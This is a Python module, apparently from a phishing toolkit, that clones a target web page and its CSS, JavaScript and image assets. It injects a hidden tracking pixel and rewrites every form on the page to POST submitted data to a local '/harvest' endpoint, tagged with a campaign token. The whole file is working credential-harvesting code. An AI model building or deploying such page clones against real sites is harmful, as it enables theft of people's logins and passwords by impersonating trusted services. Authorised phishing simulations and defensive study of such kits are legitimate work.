import os
import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from modules.utils import log_event, color

BASE_DIR = os.path.join(os.path.dirname(__file__), "..", "data", "cloned_pages")


def clone_page(url: str, campaign: str):
    """Clone a target page, inject harvester form action, save locally."""
    out_dir = os.path.join(BASE_DIR, campaign)
    assets_dir = os.path.join(out_dir, "assets")
    os.makedirs(assets_dir, exist_ok=True)

    log_event(campaign, "INFO", f"Cloning: {url}")

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
        )
    }

    try:
        resp = requests.get(url, headers=headers, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        log_event(campaign, "ERROR", f"Failed to fetch page: {e}")
        return

    soup = BeautifulSoup(resp.text, "html.parser")
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"

    # --- Download and rewrite CSS / JS / image assets ---
    _download_assets(soup, base_url, assets_dir, campaign)

    # --- Inject harvester tracking pixel ---
    pixel = soup.new_tag(
        "img",
        src="/track/open",
        width="1", height="1",
        style="display:none"
    )
    if soup.body:
        soup.body.append(pixel)

    # --- Inject form action pointing to harvester ---
    forms = soup.find_all("form")
    if not forms:
        log_event(campaign, "WARN", "No <form> found on page — manual injection may be needed.")
    for form in forms:
        form["action"] = "/harvest"
        form["method"] = "POST"
        # Inject hidden campaign token field
        hidden = soup.new_tag("input", type="hidden", name="_campaign", value=campaign)
        form.append(hidden)
        log_event(campaign, "INFO", f"Injected form action → /harvest")

    # --- Save final HTML ---
    out_path = os.path.join(out_dir, "index.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(str(soup))

    log_event(campaign, "INFO", f"Saved cloned page → {out_path}")
    print(color(f"\n[✓] Clone complete: {out_path}\n", "green"))


def _download_assets(soup, base_url: str, assets_dir: str, campaign: str):
    """Download CSS, JS, and image assets and rewrite src/href to local paths."""
    tags = {
        "link":   "href",
        "script": "src",
        "img":    "src",
    }

    for tag, attr in tags.items():
        for el in soup.find_all(tag):
            src = el.get(attr)
            if not src or src.startswith("data:") or src.startswith("#"):
                continue

            asset_url = urljoin(base_url, src)
            filename = re.sub(r"[^\w.\-]", "_", urlparse(asset_url).path.split("/")[-1])
            if not filename:
                continue

            local_path = os.path.join(assets_dir, filename)
            if not os.path.exists(local_path):
                try:
                    r = requests.get(asset_url, timeout=8)
                    with open(local_path, "wb") as f:
                        f.write(r.content)
                except Exception:
                    continue  # skip failed assets silently

            el[attr] = f"assets/{filename}"
